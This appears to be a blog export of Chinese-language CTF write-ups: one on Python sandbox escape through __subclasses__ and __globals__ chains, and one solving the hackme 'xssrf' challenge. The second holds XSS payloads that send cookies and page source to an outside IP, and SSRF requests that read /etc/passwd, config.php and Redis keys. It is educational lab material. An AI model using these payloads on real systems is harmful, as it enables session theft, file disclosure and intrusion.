&apos;tuple&apos;&gt;, &lt;class &apos;enumerate&apos;&gt;......注：没有限制的话，object类是直接可以使用的 _dict_与dir()作用相同，都是返回属性、方法等；但一些数据类型是没有__dict__属性的，如[].__dict__会返回错误 __dict__只会显示属于自己的属性，dir()除了显示自己的属性，还显示从父类继承来的属性 可以使用__dict__来间接调用一些属性或方法，如： &gt;&gt;&gt; a = [] &gt;&gt;&gt; [].__class__.__dict__[&apos;append&apos;](a, &apos;ling&apos;) &gt;&gt;&gt; a [&apos;ling&apos;]_init___init__用于初始化类，在沙盒逃逸中的作用就是为了得到function/method类型： &gt;&gt;&gt; class Base: ... def __init__(self, a, b): ... self.a = a ... def func(): ... pass ... &gt;&gt;&gt; class Child(Base): ... pass ... &gt;&gt;&gt; Child &lt;class &apos;__main__.Child&apos;&gt; &gt;&gt;&gt; &gt;&gt;&gt; Child.__init__ &lt;function Base.__init__ at 0x7f40d32ed268&gt; &gt;&gt;&gt; Child.func &lt;function Base.func at 0x7f40d32ed2f0&gt;_globals_该属性是函数/方法特有的属性，记录当前文件的全局变量的值 &gt;&gt;&gt; def func(): ... pass ... &gt;&gt;&gt; dir(func) [&apos;__annotations__&apos;, &apos;__call__&apos;, &apos;__class__&apos;, &apos;__closure__&apos;, &apos;__code__&apos;, &apos;__defaults__&apos;, &apos;__delattr__&apos;, &apos;__dict__&apos;, &apos;__dir__&apos;, &apos;__doc__&apos;, &apos;__eq__&apos;, &apos;__format__&apos;, &apos;__ge__&apos;, &apos;__get__&apos;, &apos;__getattribute__&apos;, &apos;__globals__&apos;, &apos;__gt__&apos;, &apos;__hash__&apos;, &apos;__init__&apos;, &apos;__init_subclass__&apos;, &apos;__kwdefaults__&apos;, &apos;__le__&apos;, &apos;__lt__&apos;, &apos;__module__&apos;, &apos;__name__&apos;, &apos;__ne__&apos;, &apos;__new__&apos;, &apos;__qualname__&apos;, &apos;__reduce__&apos;, &apos;__reduce_ex__&apos;, &apos;__repr__&apos;, &apos;__setattr__&apos;, &apos;__sizeof__&apos;, &apos;__str__&apos;, &apos;__subclasshook__&apos;] &gt;&gt;&gt; class Student: ... def __init__(self): ... pass ... &gt;&gt;&gt; stu = Student() &gt;&gt;&gt; stu.__init__ &lt;bound method Student.__init__ of &lt;__main__.Student instance at 0x7fba95e03cb0&gt;&gt; &gt;&gt;&gt; stu.__init__.__globals__ {&apos;func&apos;: &lt;function func at 0x7fba95db5d70&gt;, &apos;__builtins__&apos;: &lt;module &apos;__builtin__&apos; (built-in)&gt;, &apos;__package__&apos;: None, &apos;stu&apos;: &lt;__main__.Student instance at 0x7fba95e03cb0&gt;, &apos;Student&apos;: &lt;class __main__.Student at 0x7fba95da29a8&gt;, &apos;__name__&apos;: &apos;__main__&apos;, &apos;__doc__&apos;: None} &gt;&gt;&gt; Student.__init__.__globals__ {&apos;func&apos;: &lt;function func at 0x7fba95db5d70&gt;, &apos;__builtins__&apos;: &lt;module &apos;__builtin__&apos; (built-in)&gt;, &apos;__package__&apos;: None, &apos;stu&apos;: &lt;__main__.Student instance at 0x7fba95e03cb0&gt;, &apos;Student&apos;: &lt;class __main__.Student at 0x7fba95da29a8&gt;, &apos;__name__&apos;: &apos;__main__&apos;, &apos;__doc__&apos;: None} &gt;&gt;&gt; Student.__init__ &lt;unbound method Student.__init__&gt; &gt;&gt;&gt; 关于函数和方法，详见：https://segmentfault.com/a/1190000009157792 0x06.内建属性的利用如果不能直接引入os，那么就可以通过类似下面的构造链引入os： 对象 -&gt; 类 -&gt; object类 -&gt; 继承object的子类 -&gt; 函数/方法 -&gt; __globals__ -&gt; os 下面这些库中均含有os模块 &lt;class &apos;site._Printer&apos;&gt; # python2 &lt;class &apos;site.Quitter&apos;&gt; # python2 &lt;class &apos;warnings.catch_warnings&apos;&gt; # python2 &lt;class &apos;warnings.WarningMessage&apos;&gt; # python2 &lt;class &apos;os._wrap_close&apos;&gt; # python3可以写个简单的循环查找上面库的位置，例如： &gt;&gt;&gt; index = 0 &gt;&gt;&gt; for value in [].__class__.__base__.__subclasses__(): ... if &apos;site&apos; in str(value): ... print index ... break ... else: ... index += 1 ... 71利用： &gt;&gt;&gt; [].__class__.__base__.__subclasses__()[71].__init__.__globals__[&apos;os&apos;].system(&apos;ls /&apos;) bin cdrom etc initrd.img lib lost+found mnt proc run snap sys usr &lt;class &#39;site.Quitter&#39;&gt;与&lt;class &#39;site.Quitter&#39;&gt;用法一样；下面看下&lt;class &#39;warnings.catch_warnings&#39;&gt;： &gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59] &gt;&gt;&gt; &lt;class &apos;warnings.catch_warnings&apos;&gt;通过该类，可以找到linecache这个模块(将文件内容读取到内存中)，查看其可以直接调用的方法/属性： &gt;&gt;&gt; dir([].__class__.__base__.__subclasses__()[59].__init__.__globals__[&apos;linecache&apos;]) [&apos;__all__&apos;, &apos;__builtins__&apos;, &apos;__doc__&apos;, &apos;__file__&apos;, &apos;__name__&apos;, &apos;__package__&apos;, &apos;cache&apos;, &apos;checkcache&apos;, &apos;clearcache&apos;, &apos;getline&apos;, &apos;getlines&apos;, &apos;os&apos;, &apos;sys&apos;, &apos;updatecache&apos;]那么可以直接调用os： &gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.__globals__[&apos;linecache&apos;].os.system(&apos;ls /&apos;) bin dev initrd.img lib64 mnt root snap tmp vmlinuzpython3中使用&lt;class &#39;os._wrap_close&#39;&gt;： &gt;&gt;&gt; [].__class__.__base__.__subclasses__()[117] &lt;class &apos;os._wrap_close&apos;&gt; &gt;&gt;&gt; [].__class__.__base__.__subclasses__()[117].__init__.__globals__[&apos;system&apos;](&apos;ls /&apos;) bin dev initrd.img lib64 mnt root snap tmp vmlinuz其他姿势如果把字符串过滤了，那么可以使用拼接或编码的方式绕过，如果过滤单个字符[ ]： &gt;&gt;&gt; a = [&apos;a&apos;, &apos;b&apos;, &apos;c&apos;] &gt;&gt;&gt; a.__getitem__(1) &apos;b&apos; &gt;&gt;&gt; a.pop(1) &apos;b&apos; &gt;&gt;&gt; a [&apos;a&apos;, &apos;c&apos;] &gt;&gt;&gt; python3.6中可以用： &gt;&gt;&gt; f&apos;{__import__(&quot;os&quot;).system(&quot;ls /&quot;)}&apos;详见：https://docs.python.org/3.6/whatsnew/3.6.html#new-features 如果输入命令后执行结果不能回显，那么要判断沙盒能否连接外网，不能的话可以通过Time Based RCE，详情参考：https://icematcha.win/?p=532 －－－－－－－－－参考链接： https://blog.csdn.net/jblock/article/details/82938656 https://xz.aliyun.com/t/52/#toc-4 https://www.cnblogs.com/zhangxinhe/p/6963462.html https://www.cnblogs.com/f1194361820/p/9675960.html https://www.cnblogs.com/lincappu/p/8270709.html https://segmentfault.com/a/1190000009157792 https://www.freebuf.com/articles/system/203208.html]]></content>
      <categories>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[XSS && SSRF]]></title>
    <url>%2F2019%2F07%2F24%2FXSS%20%26%26%20SSRF%2F</url>
    <content type="text"><![CDATA[前两天学了些ssrf，今天偶尔看到了一篇wp，写的是关于hackme 平台上xssrf这道题的，通过xss-ssrf-redis来拿到flag，很有意思，遂学习一波 复习有关XSS的一些基础知识 HTML DOM Document对象1.在 HTML DOM (Document Object Model) 中 , 每一个元素都是 节点: 文档是一个文档节点。 所有的HTML元素都是元素节点。 所有 HTML 属性都是属性节点。 文本插入到 HTML 元素是文本节点。are text nodes。 注释是注释节点。 2.当浏览器载入 HTML 文档, 它就会成为 Document 对象。 Document 对象是 HTML 文档的根节点。 Document 对象使我们可以从脚本中对 HTML 页面中的所有元素进行访问。 3.常用的Document对象的属性和方法 document.body：返回文档的body元素 document.body.innerHTML：获取当前文档的HTML的内容 document.cookie 设置或返回与当前文档有关的所有 cookie 4.Location 对象包含有关当前 URL 的信息 XSS平台搭建现在网上好多XSS平台都不能用了 BlueLotus_XSSReceiver的开源XSS平台：https://github.com/firesunCN/BlueLotus_XSSReceiver XSS获取网页源码插件：https://www.cnblogs.com/afanti/p/8277344.html 但是用了XSS平台后就感觉使用XSS平台没有直接使用服务器方便 XSS Payload首先，先在服务器开放一个端口，创建index.php，写入： 12&lt;?phpfile_put_contents('log.php', $_SERVER['QUERY_STRING']); 之后的XSS只需把请求的目标vps改为自己新建的这个服务ip端口即可，直接查看log.php即可得到攻击的信息；原理就是，当admin查看你输入的恶意代码时，会触发事件，向vps发送请求，且会获取admin页面的参数信息如cookie、页面源码等作为参数一并发送到vps接收端，vps获取请求参数并将其写入log文件内 1.获取网页Cookie： &lt;svg/onload=&quot;document.location=&apos;http://101.132.41.135:1262/?&apos;+document.cookie&quot;&gt;实体编码后： &lt;svg/onload=&quot;&amp;#x64;&amp;#x6F;&amp;#x63;&amp;#x75;&amp;#x6D;&amp;#x65;&amp;#x6E;&amp;#x74;&amp;#x2E;&amp;#x6C;&amp;#x6F;&amp;#x63;&amp;#x61;&amp;#x74;&amp;#x69;&amp;#x6F;&amp;#x6E;&amp;#x3D;&amp;#x27;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3A;&amp;#x2F;&amp;#x2F;&amp;#x31;&amp;#x30;&amp;#x31;&amp;#x2E;&amp;#x31;&amp;#x33;&amp;#x32;&amp;#x2E;&amp;#x34;&amp;#x31;&amp;#x2E;&amp;#x31;&amp;#x33;&amp;#x35;&amp;#x3A;&amp;#x31;&amp;#x32;&amp;#x36;&amp;#x32;&amp;#x2F;&amp;#x3F;&amp;#x27;&amp;#x2B;&amp;#x64;&amp;#x6F;&amp;#x63;&amp;#x75;&amp;#x6D;&amp;#x65;&amp;#x6E;&amp;#x74;&amp;#x2E;&amp;#x63;&amp;#x6F;&amp;#x6F;&amp;#x6B;&amp;#x69;&amp;#x65;&quot;&gt;2.获取网页源码： &lt;svg/onload=&quot;document.location=&apos;http://101.132.41.135:1262/?&apos;+btoa(document.body.innerHTML)&quot;&gt;实体编码后： &lt;svg/onload=&quot;&amp;#x64;&amp;#x6F;&amp;#x63;&amp;#x75;&amp;#x6D;&amp;#x65;&amp;#x6E;&amp;#x74;&amp;#x2E;&amp;#x6C;&amp;#x6F;&amp;#x63;&amp;#x61;&amp;#x74;&amp;#x69;&amp;#x6F;&amp;#x6E;&amp;#x3D;&amp;#x27;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3A;&amp;#x2F;&amp;#x2F;&amp;#x31;&amp;#x30;&amp;#x31;&amp;#x2E;&amp;#x31;&amp;#x33;&amp;#x32;&amp;#x2E;&amp;#x34;&amp;#x31;&amp;#x2E;&amp;#x31;&amp;#x33;&amp;#x35;&amp;#x3A;&amp;#x31;&amp;#x32;&amp;#x36;&amp;#x32;&amp;#x2F;&amp;#x3F;&amp;#x27;&amp;#x2B;&amp;#x62;&amp;#x74;&amp;#x6F;&amp;#x61;&amp;#x28;&amp;#x64;&amp;#x6F;&amp;#x63;&amp;#x75;&amp;#x6D;&amp;#x65;&amp;#x6E;&amp;#x74;&amp;#x2E;&amp;#x62;&amp;#x6F;&amp;#x64;&amp;#x79;&amp;#x2E;&amp;#x69;&amp;#x6E;&amp;#x6E;&amp;#x65;&amp;#x72;&amp;#x48;&amp;#x54;&amp;#x4D;&amp;#x4C;&amp;#x29;&quot;&gt;3.Ajax请求 可以用此方法在请求时指定内网路径和参数，如POST数据的payload： &lt;svg/onload=&quot; xmlhttp=new XMLHttpRequest(); xmlhttp.onreadystatechange=function() { if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200) { document.location=&apos;http://101.132.41.135:1262/?&apos;+btoa(xmlhttp.responseText); } } xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true); xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;); xmlhttp.send(&quot;url=file:///etc/passwd&quot;); &quot;&gt;HTML实体在线编码网址：https://www.qqxiuzi.cn/bianma/zifushiti.php hackme xssrf这相当于一道题目藏了三个flag，不过hackme平台把题目分成三道题了 在测试时，发现打不到cookie，但源码可以打到，不知道是不是题目的问题…不过这道题的第一个藏在cookie中的flag与第二个和第三个flag没什么关系，所以跳过第一个，直接进行第二步和第三步 首先进行信息收集，扫到以下路径： git只是具有诱导作用，并不能恢复出文件；backup.zip下载后需要密码才能解压；访问robots.txt文件，得到以下信息： 1234User-agent: *Disallow: /config.phpDisallow: /you/cant/read/config.php/can/you?Disallow: /backup.zip 访问/config.php不过什么都没显示；接下来进行xss探测： 可以得到admin访问的路径Referer: http://localhost/read.php?id=5520 由于没有成功打到cookie，这里就不打cookie了 读取read.php源码： 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;nav class=&quot;navbar navbar-expand-lg navbar-dark bg-dark d-flex&quot;&gt; &lt;a class=&quot;navbar-brand&quot; href=&quot;index.php&quot;&gt;XSSRF&lt;/a&gt; &lt;ul class=&quot;navbar-nav&quot;&gt; &lt;li class=&quot;nav-item&quot;&gt; &lt;a class=&quot;nav-link&quot; href=&quot;sendmail.php&quot;&gt;Send Mail&lt;/a&gt; &lt;/li&gt; &lt;li class=&quot;nav-item&quot;&gt; &lt;a class=&quot;nav-link&quot; href=&quot;mailbox.php&quot;&gt;Mailbox&lt;/a&gt; &lt;/li&gt; &lt;li class=&quot;nav-item&quot;&gt; &lt;a class=&quot;nav-link&quot; href=&quot;sentmail.php&quot;&gt;Sent Mail&lt;/a&gt; &lt;/li&gt; &lt;li class=&quot;nav-item&quot;&gt; &lt;a class=&quot;nav-link&quot; href=&quot;setadmin.php&quot;&gt;Set Admin&lt;/a&gt; &lt;/li&gt; &lt;li class=&quot;nav-item&quot;&gt; &lt;a class=&quot;nav-link&quot; href=&quot;request.php&quot;&gt;Send Request&lt;/a&gt; &lt;/li&gt; &lt;/ul&gt; &lt;ul class=&quot;navbar-nav ml-auto&quot;&gt; &lt;li class=&quot;nav-item&quot;&gt; &lt;span class=&quot;navbar-text&quot;&gt;Hello, admin (Administrator)&lt;/span&gt; &lt;/li&gt; &lt;li class=&quot;nav-item&quot;&gt; &lt;a class=&quot;nav-link&quot; href=&quot;logout.php&quot;&gt;Logout&lt;/a&gt; &lt;/li&gt; &lt;/ul&gt;&lt;/nav&gt; &lt;div class=&quot;container&quot;&gt; &lt;div class=&quot;card text-white bg-dark&quot;&gt; &lt;div class=&quot;card-body&quot;&gt; &lt;h2 class=&quot;card-title&quot;&gt; asdf &lt;/h2&gt; &lt;h4&gt;From: &lt;a href=&quot;sendmail.php?to=dropsec&quot;&gt;dropsec&lt;/a&gt;&lt;/h4&gt; &lt;div class=&quot;card-text&quot;&gt;&lt;svg onload=&quot;document.location=&apos;http://101.132.41.135:1262/?&apos;+btoa(document.body.innerHTML)&quot;&gt;&lt;/svg&gt;&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; 发现其中多了两个文件，一个setadmin.php，一个request.php，用Ajax请求来分别获取这两个文件源码 setadmin.php： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;XSSRF - Set Admin&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;bootstrap/css/bootstrap.min.css&quot; media=&quot;all&quot;&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;style.css&quot; media=&quot;all&quot;&gt; &lt;/head&gt; &lt;body&gt;&lt;nav class=&quot;navbar navbar-expand-lg navbar-dark bg-dark d-flex&quot;&gt; &lt;a class=&quot;navbar-brand&quot; href=&quot;index.php&quot;&gt;XSSRF&lt;/a&gt; &lt;ul class=&quot;navbar-nav&quot;&gt; &lt;li class=&quot;nav-item&quot;&gt; &lt;a class=&quot;nav-link&quot; href=&quot;sendmail.php&quot;&gt;Send Mail&lt;/a&gt; &lt;/li&gt; &lt;li class=&quot;nav-item&quot;&gt; &lt;a class=&quot;nav-link&quot; href=&quot;mailbox.php&quot;&gt;Mailbox&lt;/a&gt; &lt;/li&gt; &lt;li class=&quot;nav-item&quot;&gt; &lt;a class=&quot;nav-link&quot; href=&quot;sentmail.php&quot;&gt;Sent Mail&lt;/a&gt; &lt;/li&gt; &lt;li class=&quot;nav-item&quot;&gt; &lt;a class=&quot;nav-link&quot; href=&quot;setadmin.php&quot;&gt;Set Admin&lt;/a&gt; &lt;/li&gt; &lt;li class=&quot;nav-item&quot;&gt; &lt;a class=&quot;nav-link&quot; href=&quot;request.php&quot;&gt;Send Request&lt;/a&gt; &lt;/li&gt; &lt;/ul&gt; &lt;ul class=&quot;navbar-nav ml-auto&quot;&gt; &lt;li class=&quot;nav-item&quot;&gt; &lt;span class=&quot;navbar-text&quot;&gt;Hello, admin (Administrator)&lt;/span&gt; &lt;/li&gt; &lt;li class=&quot;nav-item&quot;&gt; &lt;a class=&quot;nav-link&quot; href=&quot;logout.php&quot;&gt;Logout&lt;/a&gt; &lt;/li&gt; &lt;/ul&gt;&lt;/nav&gt; &lt;div class=&quot;container&quot;&gt; &lt;form action=&quot;/setadmin.php&quot; method=&quot;POST&quot;&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;label for=&quot;username&quot;&gt;Username&lt;/label&gt; &lt;input type=&quot;text&quot; name=&quot;username&quot; class=&quot;form-control&quot; id=&quot;username&quot; aria-describedby=&quot;username&quot; placeholder=&quot;Username&quot;&gt; &lt;/div&gt; &lt;button class=&quot;btn btn-primary&quot;&gt;Give Admin Access&lt;/button&gt; &lt;/form&gt; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; request.php： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;XSSRF - Request&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;bootstrap/css/bootstrap.min.css&quot; media=&quot;all&quot;&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;style.css&quot; media=&quot;all&quot;&gt; &lt;style&gt;pre &#123; background-color: #eee; padding: 5px; &#125;&lt;/style&gt; &lt;/head&gt; &lt;body&gt;&lt;nav class=&quot;navbar navbar-expand-lg navbar-dark bg-dark d-flex&quot;&gt; &lt;a class=&quot;navbar-brand&quot; href=&quot;index.php&quot;&gt;XSSRF&lt;/a&gt; &lt;ul class=&quot;navbar-nav&quot;&gt; &lt;li class=&quot;nav-item&quot;&gt; &lt;a class=&quot;nav-link&quot; href=&quot;sendmail.php&quot;&gt;Send Mail&lt;/a&gt; &lt;/li&gt; &lt;li class=&quot;nav-item&quot;&gt; &lt;a class=&quot;nav-link&quot; href=&quot;mailbox.php&quot;&gt;Mailbox&lt;/a&gt; &lt;/li&gt; &lt;li class=&quot;nav-item&quot;&gt; &lt;a class=&quot;nav-link&quot; href=&quot;sentmail.php&quot;&gt;Sent Mail&lt;/a&gt; &lt;/li&gt; &lt;li class=&quot;nav-item&quot;&gt; &lt;a class=&quot;nav-link&quot; href=&quot;setadmin.php&quot;&gt;Set Admin&lt;/a&gt; &lt;/li&gt; &lt;li class=&quot;nav-item&quot;&gt; &lt;a class=&quot;nav-link&quot; href=&quot;request.php&quot;&gt;Send Request&lt;/a&gt; &lt;/li&gt; &lt;/ul&gt; &lt;ul class=&quot;navbar-nav ml-auto&quot;&gt; &lt;li class=&quot;nav-item&quot;&gt; &lt;span class=&quot;navbar-text&quot;&gt;Hello, admin (Administrator)&lt;/span&gt; &lt;/li&gt; &lt;li class=&quot;nav-item&quot;&gt; &lt;a class=&quot;nav-link&quot; href=&quot;logout.php&quot;&gt;Logout&lt;/a&gt; &lt;/li&gt; &lt;/ul&gt;&lt;/nav&gt; &lt;div class=&quot;container&quot;&gt; &lt;form action=&quot;/request.php&quot; method=&quot;POST&quot;&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;label for=&quot;url&quot;&gt;URL&lt;/label&gt; &lt;textarea name=&quot;url&quot; class=&quot;form-control&quot; id=&quot;url&quot; aria-describedby=&quot;url&quot; placeholder=&quot;URL&quot; rows=&quot;10&quot;&gt;&lt;/textarea&gt; &lt;/div&gt; &lt;button class=&quot;btn btn-primary&quot;&gt;Send Request&lt;/button&gt; &lt;/form&gt; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; 先用Ajax对setadmin.php发起请求： xmlhttp=new XMLHttpRequest(); xmlhttp.onreadystatechange=function() { if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200) { document.location=&apos;http://101.132.41.135:1262/?&apos;+btoa(xmlhttp.responseText); } } xmlhttp.open(&quot;POST&quot;,&quot;setadmin.php&quot;,true); xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;); xmlhttp.send(&quot;username=dropsec&quot;);结果打到的页面显示说This user is already a admin.，，， 那就对request.php发起请求，可以看到表单name为url，试探是不是ssrf： xmlhttp=new XMLHttpRequest(); xmlhttp.onreadystatechange=function() { if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200) { document.location=&apos;http://101.132.41.135:1262/?&apos;+btoa(xmlhttp.responseText); } } xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true); xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;); xmlhttp.send(&quot;url=file:///etc/passwd&quot;);得到的页面显示出了/etc/passwd的内容 接下来尝试获取config.php内容，这里需要猜测网站根目录： Apache /var/wwww/html Nginx /usr/local/nginx/html1234567891011xmlhttp=new XMLHttpRequest();xmlhttp.onreadystatechange=function()&#123; if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200) &#123; document.location=&apos;http://101.132.41.135:1262/?&apos;+btoa(xmlhttp.responseText); &#125;&#125; xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true); xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;); xmlhttp.send(&quot;url=file:///var/www/html/config.php&quot;); 得到flag，并且得到下一个flag的提示： 12345678910111213141516&lt;?php// database configdefine('DB_USER', 'xssrf');define('DB_PASS', 'xssrfmeplz');define('DB_HOST', 'host=localhost');define('DB_NAME', 'xssrf');// redis configdefine('REDIS_HOST', 'localhost');define('REDIS_PORT', 25566);// define flagdefine('FLAG', 'FLAG&#123;curl -v -o flag --next flag://in-the.redis/the?port=25566&amp;good=luck&#125;');$c_hardness = 5; // how many proof of work leading zeros 使用dict或gopher协议来获取redis信息： xmlhttp=new XMLHttpRequest(); xmlhttp.onreadystatechange=function() { if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200) { document.location=&apos;http://101.132.41.135:1262/?&apos;+btoa(xmlhttp.responseText); } } xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true); xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;); xmlhttp.send(&quot;url=dict://127.0.0.1:25566/KEYS *&quot;);得到如下关键信息： -ERR Syntax error, try CLIENT (LIST | KILL ip:port | GETNAME | SETNAME connection-name) *1 $4 flag +OK关于redis未授权访问： 我们可以通过以下命令查看是否设置了密码验证： 123127.0.0.1:6379&gt; CONFIG get requirepass1) &quot;requirepass&quot;2) &quot;&quot; 默认情况下 requirepass 参数是空的，这就意味着你无需通过密码验证就可以连接到 redis 服务。 你可以通过以下命令来修改该参数： 12345127.0.0.1:6379&gt; CONFIG set requirepass &quot;runoob&quot;OK127.0.0.1:6379&gt; CONFIG get requirepass1) &quot;requirepass&quot;2) &quot;runoob&quot; 设置密码后，客户端连接 redis 服务就需要密码验证，否则无法执行命令。 有了键名称，接下来获取值： xmlhttp=new XMLHttpRequest(); xmlhttp.onreadystatechange=function() { if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200) { document.location=&apos;http://101.132.41.135:1262/?&apos;+btoa(xmlhttp.responseText); } } xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true); xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;); xmlhttp.send(&quot;url=dict://127.0.0.1:25566/GET flag&quot;);本以为能直接获取到flag，但报错了： WRONGTYPE Operation against a key holding the wrong kind of value说值的类型错误，那就查看flag的类型： xmlhttp=new XMLHttpRequest(); xmlhttp.onreadystatechange=function() { if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200) { document.location=&apos;http://101.132.41.135:1262/?&apos;+btoa(xmlhttp.responseText); } } xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true); xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;); xmlhttp.send(&quot;url=dict://127.0.0.1:25566/TYPE flag&quot;);得到类型list，关于redis的list，有以下简单说明： Redis列表是简单的字符串列表，按照插入顺序排序。你可以添加一个元素到列表的头部（左边）或者尾部（右边） 一个列表最多可以包含 232 - 1 个元素 (4294967295, 每个列表超过40亿个元素)。 1234567891011redis 127.0.0.1:6379&gt; LPUSH runoobkey redis(integer) 1redis 127.0.0.1:6379&gt; LPUSH runoobkey mongodb(integer) 2redis 127.0.0.1:6379&gt; LPUSH runoobkey mysql(integer) 3redis 127.0.0.1:6379&gt; LRANGE runoobkey 0 101) &quot;mysql&quot;2) &quot;mongodb&quot;3) &quot;redis&quot; 之后查看flag列表长度： 1234567891011xmlhttp=new XMLHttpRequest();xmlhttp.onreadystatechange=function()&#123; if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200) &#123; document.location=&apos;http://101.132.41.135:1262/?&apos;+btoa(xmlhttp.responseText); &#125;&#125; xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true); xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;); xmlhttp.send(&quot;url=dict://127.0.0.1:25566/LLEN flag&quot;); 得到长度53 最后查看flag列表的值： 1234567891011xmlhttp=new XMLHttpRequest();xmlhttp.onreadystatechange=function()&#123; if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200) &#123; document.location=&apos;http://101.132.41.135:1262/?&apos;+btoa(xmlhttp.responseText); &#125;&#125; xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true); xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;); xmlhttp.send(&quot;url=dict://127.0.0.1:25566/LRANGE flag 0 53&quot;); 得到数据： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106&amp;NewLine;&amp;dollar;1&amp;NewLine;&amp;rcub;&amp;NewLine;&amp;dollar;1&amp;NewLine;t&amp;NewLine;&amp;dollar;1&amp;NewLine;i&amp;NewLine;&amp;dollar;1&amp;NewLine;o&amp;NewLine;&amp;dollar;1&amp;NewLine;l&amp;NewLine;&amp;dollar;1&amp;NewLine;p&amp;NewLine;&amp;dollar;1&amp;NewLine;x&amp;NewLine;&amp;dollar;1&amp;NewLine;e&amp;NewLine;&amp;dollar;1&amp;NewLine; &amp;NewLine;&amp;dollar;1&amp;NewLine;o&amp;NewLine;&amp;dollar;1&amp;NewLine;t&amp;NewLine;&amp;dollar;1&amp;NewLine; &amp;NewLine;&amp;dollar;1&amp;NewLine;y&amp;NewLine;&amp;dollar;1&amp;NewLine;s&amp;NewLine;&amp;dollar;1&amp;NewLine;a&amp;NewLine;&amp;dollar;1&amp;NewLine;e&amp;NewLine;&amp;dollar;1&amp;NewLine; &amp;NewLine;&amp;dollar;1&amp;NewLine;s&amp;NewLine;&amp;dollar;1&amp;NewLine;i&amp;NewLine;&amp;dollar;1&amp;NewLine; &amp;NewLine;&amp;dollar;1&amp;NewLine;n&amp;NewLine;&amp;dollar;1&amp;NewLine;o&amp;NewLine;&amp;dollar;1&amp;NewLine;i&amp;NewLine;&amp;dollar;1&amp;NewLine;t&amp;NewLine;&amp;dollar;1&amp;NewLine;a&amp;NewLine;&amp;dollar;1&amp;NewLine;c&amp;NewLine;&amp;dollar;1&amp;NewLine;i&amp;NewLine;&amp;dollar;1&amp;NewLine;t&amp;NewLine;&amp;dollar;1&amp;NewLine;n&amp;NewLine;&amp;dollar;1&amp;NewLine;e&amp;NewLine;&amp;dollar;1&amp;NewLine;h&amp;NewLine;&amp;dollar;1&amp;NewLine;t&amp;NewLine;&amp;dollar;1&amp;NewLine;u&amp;NewLine;&amp;dollar;1&amp;NewLine;a&amp;NewLine;&amp;dollar;1&amp;NewLine; &amp;NewLine;&amp;dollar;1&amp;NewLine;t&amp;NewLine;&amp;dollar;1&amp;NewLine;u&amp;NewLine;&amp;dollar;1&amp;NewLine;o&amp;NewLine;&amp;dollar;1&amp;NewLine;h&amp;NewLine;&amp;dollar;1&amp;NewLine;t&amp;NewLine;&amp;dollar;1&amp;NewLine;i&amp;NewLine;&amp;dollar;1&amp;NewLine;w&amp;NewLine;&amp;dollar;1&amp;NewLine; &amp;NewLine;&amp;dollar;1&amp;NewLine;s&amp;NewLine;&amp;dollar;1&amp;NewLine;i&amp;NewLine;&amp;dollar;1&amp;NewLine;d&amp;NewLine;&amp;dollar;1&amp;NewLine;e&amp;NewLine;&amp;dollar;1&amp;NewLine;R&amp;NewLine;&amp;dollar;1&amp;NewLine;&amp;lbrace;&amp;NewLine;&amp;dollar;1&amp;NewLine;G&amp;NewLine;&amp;dollar;1&amp;NewLine;A&amp;NewLine;&amp;dollar;1&amp;NewLine;L&amp;NewLine;&amp;dollar;1&amp;NewLine;F 写脚本: 1234567f = open('str.txt', 'r').read()f = f.replace('&amp;NewLine;', '')f = f.replace('&amp;dollar;1', '')f = f.replace('\n', '')print(f[::-1]) 